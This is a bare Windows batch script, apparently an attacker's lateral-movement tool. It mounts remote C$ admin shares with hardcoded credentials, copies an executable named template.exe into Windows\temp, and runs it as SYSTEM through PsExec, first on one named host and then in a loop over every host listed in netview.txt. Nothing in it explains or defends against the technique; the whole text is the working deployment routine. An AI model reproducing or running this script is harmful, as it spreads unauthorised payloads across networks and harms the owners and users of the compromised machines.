@echo off
  net use  \\TS0002\c$  l    /user:loc\fa  
  copy template.exe \\TS0002\c$\windows\temp\template.exe
  psexec.exe  /accepteula
  Psexec.exe -s \\TS0002 c:\WINDOWS\system32\cmd.exe  /c start  c:\WINDOWS\temp\template.exe
  net use \\TS0002\c$ /del

@echo off
for /f   %%i in (netview.txt) do (
  net use %%i\c$ "password" /user:user\locaback
  copy template.exe %%i\c$\windows\temp\temp.exe
  psexec  /accepteula
  Psexec -s %%i c:\WINDOWS\system32\cmd.exe  /c start  c:\WINDOWS\temp\temp.exe
  net use %%i\c$
)
